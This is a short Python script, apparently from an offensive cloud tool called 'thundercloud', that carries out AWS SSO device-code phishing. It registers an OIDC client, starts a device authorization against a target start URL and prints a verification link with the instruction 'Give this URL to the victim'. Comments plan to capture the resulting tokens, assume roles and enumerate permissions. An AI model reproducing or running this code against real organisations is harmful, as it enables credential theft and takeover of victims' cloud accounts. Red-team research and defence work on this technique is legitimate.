# link expires in 6mins/ verify it and update script
# update script to extract tokens after link is clicked
# also update script to assume roles from the list
# after assuming roles, enumerate permissions
import boto3

class AWSSSO:
    pass
    def attack(self, url, region):
        sso_oidc = boto3.client('sso-oidc', region_name= region)
        client = sso_oidc.register_client(
            clientName = 'thundercloud',
            clientType = 'public'
        )
        client_id = client.get('clientId')
        client_secret = client.get('clientSecret')
        authz = sso_oidc.start_device_authorization(
            clientId = client_id,
            clientSecret = client_secret,
            startUrl = url
        )
        url = authz.get('verificationUriComplete')
        deviceCode = authz.get('deviceCode')
        print(client_id, client_secret, deviceCode)
        print("Give this URL to the victim\n" + url)
